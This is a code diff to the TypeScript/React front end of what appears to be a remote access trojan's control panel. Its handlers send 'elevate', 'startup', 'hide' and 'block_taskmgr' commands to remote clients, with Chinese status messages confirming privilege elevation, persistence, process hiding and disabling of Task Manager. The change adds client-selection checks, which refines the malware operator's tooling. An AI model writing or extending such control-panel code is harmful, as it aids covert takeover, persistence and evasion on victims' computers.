@@ -994,21 +994,37 @@ export default function Home() {
   }
 
   const handleElevate = (clientId: string) => {
+    if (!selectedClient) {
+      showMessage('请先选择客户端', 'error')
+      return
+    }
     sendRemoteCommand(clientId, '', 'elevate')
     showMessage('已请求提权', 'success')
   }
 
   const handleAddStartup = (clientId: string) => {
+    if (!selectedClient) {
+      showMessage('请先选择客户端', 'error')
+      return
+    }
     sendRemoteCommand(clientId, '', 'startup')
     showMessage('已添加到开机启动', 'success')
   }
 
   const handleHideProcess = (clientId: string) => {
+    if (!selectedClient) {
+      showMessage('请先选择客户端', 'error')
+      return
+    }
     sendRemoteCommand(clientId, '', 'hide')
     showMessage('进程已隐藏', 'success')
   }
 
   const handleBlockTaskMgr = (clientId: string) => {
+    if (!selectedClient) {
+      showMessage('请先选择客户端', 'error')
+      return
+    }
     sendRemoteCommand(clientId, '', 'block_taskmgr')
     showMessage('任务管理器已禁用', 'success')
   }
